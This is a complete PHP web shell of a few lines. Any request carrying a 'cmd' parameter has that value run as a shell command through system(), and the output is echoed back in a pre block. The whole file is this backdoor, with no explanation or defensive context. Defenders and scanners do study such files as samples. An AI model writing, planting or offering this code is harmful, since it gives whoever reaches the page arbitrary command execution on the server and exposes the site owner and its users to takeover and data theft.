<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    echo "<pre>";
    $result = system($cmd);
    echo "</pre>";
}
?>
